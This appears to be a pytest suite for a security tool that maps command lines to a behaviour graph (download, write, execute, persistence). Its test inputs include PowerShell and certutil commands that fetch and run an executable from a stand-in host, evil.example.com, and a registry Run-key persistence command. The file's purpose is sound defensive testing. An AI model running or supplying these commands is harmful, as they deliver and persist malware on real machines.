"""Canonical Behaviour Graph · regression suite.

Locks in the SME-approved contract for the graph:
    * every fired intent produces at least one behaviour node,
    * every node carries canonical Evidence,
    * every node ties back to an intent category,
    * the Download → Write → (Remote) Execute chain is explicit
      whenever the intent layer identifies the chain,
    * atomic-IOC and benign inputs produce an EMPTY graph,
    * the graph shape is deterministic across replays.
"""
from __future__ import annotations

import pytest

from v2.investigation.behavior import build as build_behavior
from v2.investigation.behavior.models import (
    BehaviorArgKind,
    BehaviorEdgeKind,
    BehaviorKind,
)
from v2.investigation.pipeline import investigate


CHAIN_SAMPLE = (
    'Invoke-WebRequest http://evil.example.com/a.exe -OutFile a.exe; Start-Process a.exe'
)

CERTUTIL_SAMPLE = (
    'certutil.exe -urlcache -split -f http://evil.example.com/a.exe '
    'C:\\Users\\Public\\a.exe && start C:\\Users\\Public\\a.exe'
)

PERSISTENCE_SAMPLE = (
    'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
    '-Name X -Value calc.exe'
)

BENIGN_SAMPLE = 'Write-Host "Hello, world"'
ATOMIC_SAMPLE = 'scwxc.exe'


def _kinds(nodes):
    return [n.kind.value for n in nodes]


def test_chain_graph_has_canonical_shape():
    r = investigate(CHAIN_SAMPLE)
    kinds = _kinds(r.behavior.nodes)
    assert kinds[:4] == ["download", "write_file", "remote_execution", "execute"], (
        f"expected download → write_file → remote_execution → execute, got {kinds}"
    )
    assert r.behavior.has_chain(
        "download", "write_file", "remote_execution", "execute"
    ), "canonical chain must be reachable via edges"


def test_chain_edges_are_typed_correctly():
    r = investigate(CHAIN_SAMPLE)
    by_kind: dict[str, list[tuple[str, str]]] = {}
    for e in r.behavior.edges:
        by_kind.setdefault(e.kind.value, []).append((e.src, e.dst))
    assert "writes_to" in by_kind, "download must write_to a file node"
    assert "executes"  in by_kind, "execute node must be reached via executes"
    assert "then"      in by_kind, "sequential then-edge missing"


def test_chain_url_and_domain_args_attached_to_download():
    r = investigate(CHAIN_SAMPLE)
    download = next(n for n in r.behavior.nodes if n.kind == BehaviorKind.DOWNLOAD)
    arg_kinds = {a.kind for a in download.args}
    assert BehaviorArgKind.URL    in arg_kinds
    assert BehaviorArgKind.DOMAIN in arg_kinds


def test_chain_write_file_arg_is_the_download_destination():
    r = investigate(CHAIN_SAMPLE)
    write = next(n for n in r.behavior.nodes if n.kind == BehaviorKind.WRITE_FILE)
    files = {a.value for a in write.args if a.kind == BehaviorArgKind.FILE}
    assert "a.exe" in files


def test_chain_execute_arg_matches_write_target():
    r = investigate(CHAIN_SAMPLE)
    execs = [n for n in r.behavior.nodes if n.kind == BehaviorKind.EXECUTE]
    assert execs, "chain must emit at least one execute node"
    files = {a.value for e in execs for a in e.args
              if a.kind == BehaviorArgKind.FILE}
    assert "a.exe" in files


def test_certutil_variant_produces_same_canonical_shape():
    r = investigate(CERTUTIL_SAMPLE)
    kinds = _kinds(r.behavior.nodes)
    assert "download"         in kinds
    assert "write_file"       in kinds
    assert "remote_execution" in kinds
    assert "execute"          in kinds


def test_every_node_carries_evidence():
    r = investigate(CHAIN_SAMPLE)
    for n in r.behavior.nodes:
        assert n.evidence, (
            f"behaviour node {n.id} ({n.kind.value}) has no evidence — "
            "behaviours without evidence must not be emitted"
        )
        assert n.source_intent, (
            f"behaviour node {n.id} missing source_intent for provenance"
        )


def test_persistence_intent_maps_to_persistence_behaviour():
    r = investigate(PERSISTENCE_SAMPLE)
    assert any(n.kind == BehaviorKind.PERSISTENCE for n in r.behavior.nodes), (
        f"persistence intent must emit persistence behaviour, "
        f"got {_kinds(r.behavior.nodes)}"
    )
    persistence = next(n for n in r.behavior.nodes if n.kind == BehaviorKind.PERSISTENCE)
    reg_args = [a for a in persistence.args if a.kind == BehaviorArgKind.REGISTRY]
    assert reg_args, "persistence node must carry the registry key it targets"


def test_benign_produces_empty_graph():
    r = investigate(BENIGN_SAMPLE)
    assert r.behavior.nodes == []
    assert r.behavior.edges == []


def test_atomic_ioc_produces_empty_graph():
    r = investigate(ATOMIC_SAMPLE)
    assert r.behavior.nodes == []
    assert r.behavior.edges == []


def test_graph_is_deterministic_across_replays():
    r1 = investigate(CHAIN_SAMPLE)
    r2 = investigate(CHAIN_SAMPLE)
    assert r1.behavior.to_dict() == r2.behavior.to_dict()


def test_analyst_report_exposes_behavior_graph():
    r = investigate(CHAIN_SAMPLE)
    bg = r.report.behavior_graph
    assert isinstance(bg, dict)
    assert set(bg.keys()) == {"schema_version", "nodes", "edges"}
    assert len(bg["nodes"]) == len(r.behavior.nodes)
    assert len(bg["edges"]) == len(r.behavior.edges)


def test_behavior_kinds_stay_within_the_closed_taxonomy():
    """No behaviour outside the declared taxonomy may leak into the
    graph — new kinds require a Trust Corpus sample justifying them."""
    allowed = {k.value for k in BehaviorKind}
    for sample in (CHAIN_SAMPLE, CERTUTIL_SAMPLE, PERSISTENCE_SAMPLE, BENIGN_SAMPLE):
        r = investigate(sample)
        for n in r.behavior.nodes:
            assert n.kind.value in allowed, (
                f"behaviour {n.kind.value!r} not in the declared taxonomy"
            )


def test_verdict_engine_can_use_has_chain_helper():
    """The ``has_chain`` helper is the primitive the Verdict Engine
    (and future Behaviour Correlation) will call. It must return
    True for the canonical chain and False for graphs missing one
    of the required kinds."""
    r_chain = investigate(CHAIN_SAMPLE)
    assert r_chain.behavior.has_chain("download", "write_file", "execute")
    r_persist = investigate(PERSISTENCE_SAMPLE)
    assert not r_persist.behavior.has_chain("download", "write_file", "execute")


def test_download_only_still_admits_write_file_but_no_execute():
    """Honesty gate at the behaviour graph layer — a download-only
    sample must emit DOWNLOAD (and WRITE_FILE when the destination
    is known) but NOT REMOTE_EXECUTION or EXECUTE."""
    r = investigate(
        'Invoke-WebRequest -Uri "https://update.example.com/patch.exe" '
        '-OutFile "$env:TEMP\\patch.exe"'
    )
    kinds = _kinds(r.behavior.nodes)
    assert "download"         in kinds
    assert "write_file"       in kinds
    assert "remote_execution" not in kinds
    assert "execute"          not in kinds
